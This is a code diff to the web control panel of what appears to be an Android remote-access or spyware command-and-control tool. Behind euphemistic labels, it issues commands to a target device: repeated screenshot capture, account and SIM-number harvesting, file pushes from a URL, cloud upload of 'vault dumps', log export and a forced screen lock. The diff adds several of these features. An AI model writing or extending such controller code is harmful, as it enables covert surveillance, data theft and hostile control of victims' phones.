@@ -328,8 +328,10 @@
                     <label class="cmd-label">Display Snapshot</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('GET_SCREENSHOT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SCREENSHOT')">?</button>
-                        <input type="number" id="scr-quality" value="70" placeholder="Quality %" style="flex:1">
-                        <button class="btn" onclick="sendCmd('GET_SCREENSHOT')">Screenshot</button>
+                        <input type="number" id="scr-quality" value="70" title="Quality %" style="width:50px">
+                        <input type="number" id="scr-freq" value="0" title="Freq (0=Single)" style="width:50px">
+                        <input type="number" id="scr-dur" value="0" title="Duration (s)" style="width:50px">
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_SCREENSHOT')">Capture</button>
                     </div>
                 </div>
                 <div class="cmd-row">
@@ -425,7 +427,14 @@
                 </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SKELETON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_VAULT_SIZE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
-                <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Identity Extraction</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Accounts</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('GET_NUMBERS')">SIMs</button>
+                    </div>
+                </div>
                 <div class="cmd-row"><label class="cmd-label">Environmental Audit (Sensors)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SENSORS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SENSORS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_SENSORS')">Sample Physical State</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Forensic Sync (Cloud)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('UPLOAD_DUMPS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('UPLOAD_DUMPS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('UPLOAD_DUMPS')">Sync Vault Dumps</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Diagnostic System Logs</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_LOGS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_LOGS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_LOGS')">Export Logcat</button></div></div>
@@ -488,6 +497,12 @@
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('STOP_BEACON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('STOP_BEACON')">?</button>
                         <button class="btn danger" style="flex:1" onclick="sendCmd('STOP_BEACON')">Dark Mode (Stop Beacon)</button>
+                    </div>
+                </div>
+                <div class="cmd-row" style="margin-top:10px;">
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('LOCK_SCREEN', this)">🏷️</button><button class="btn-status" onclick="auditCmd('LOCK_SCREEN')">?</button>
+                        <button class="btn danger" style="flex:1" onclick="sendCmd('LOCK_SCREEN')">FORCE HARDWARE LOCK</button>
                     </div>
                 </div>
                 <div class="cmd-row" style="margin-top:10px;">
@@ -766,7 +781,11 @@
                     case 'SET_INTERVAL': content = document.getElementById('val-work').value; break;
                     case 'PING': content = 'Online?'; break;
                     case 'GET_TOKEN': content = ''; break;
-                    case 'GET_SCREENSHOT': content = document.getElementById('scr-quality').value || '70'; break;
+                    case 'GET_SCREENSHOT': 
+                        const sq = document.getElementById('scr-quality').value || '70';
+                        const sf = document.getElementById('scr-freq').value || '0';
+                        const sd = document.getElementById('scr-dur').value || '0';
+                        content = sq + '|' + sf + '|' + sd; break;
                     case 'PUSH_FILE': 
                         // This is now handled by handlePushDeployment, but we keep the fallback
                         content = `${document.getElementById('push-url').value} | ${document.getElementById('push-path').value}`; break;
@@ -824,6 +843,8 @@
                         content = `${document.getElementById('bri-level').value} | ${document.getElementById('bri-method').value}`; break;
                     case 'UNBLIND':
                     case 'GET_ACCOUNTS':
+                    case 'GET_NUMBERS':
+                    case 'LOCK_SCREEN':
                     case 'GET_SENSORS':
                     case 'REMOVE_UI':
                     case 'GET_ENGAGEMENT':
@@ -960,15 +981,11 @@
                 }
 
                 if (c.file_name === 'GET_ACCOUNTS' && c.result_data && c.result_data.accounts) {
-                    dataHtml = `<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;">
-                        <div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">IDENTITY_REGISTRY (${c.result_data.accounts.length} ENTRIES)</div>
-                        ${c.result_data.accounts.map(acc => `
-                            <div style="margin-bottom:8px; border-left:2px solid var(--primary); padding-left:8px;">
-                                <div style="color:#fff; font-size:0.8rem; word-break:break-all;">${acc.name}</div>
-                                <div style="color:#666; font-size:0.6rem; text-transform:uppercase;">${acc.type}</div>
-                            </div>
-                        `).join('')}
-                    </div>`;
+                    dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">IDENTITY_REGISTRY (' + c.result_data.accounts.length + ' ENTRIES)</div>' + c.result_data.accounts.map(acc => '<div style="margin-bottom:8px; border-left:2px solid var(--primary); padding-left:8px; display:flex; justify-content:space-between; align-items:center;"><div><div style="color:#fff; font-size:0.8rem; word-break:break-all;">' + acc.name + '</div><div style="color:#666; font-size:0.5rem; text-transform:uppercase;">' + acc.type + '</div></div><div style="font-size:0.55rem; color:var(--primary); opacity:0.6; border:1px solid var(--primary); padding:2px 4px;">' + (acc.src || 'N/A') + '</div></div>').join('') + '</div>';
+                }
+
+                if (c.file_name === 'GET_NUMBERS' && c.result_data && c.result_data.sim_cards) {
+                    dataHtml = '<div style="margin-top:10px; padding:10px; background:rgba(0,243,255,0.05); border:1px solid #333;"><div style="color:var(--primary); font-size:0.7rem; font-weight:bold; border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:8px;">SIM_HARDWARE_REGISTRY</div>' + c.result_data.sim_cards.map(sim => '<div style="margin-bottom:8px; border-left:2px solid var(--success); padding-left:8px;"><div style="color:#fff; font-size:0.85rem;">' + sim.number + '</div><div style="color:#666; font-size:0.6rem;">SLOT: ' + sim.slot + ' | CARRIER: ' + sim.carrier + ' | ' + sim.country.toUpperCase() + '</div></div>').join('') + '</div>';
                 }
 
                 if (type === 'FORCE_UPLOAD') {
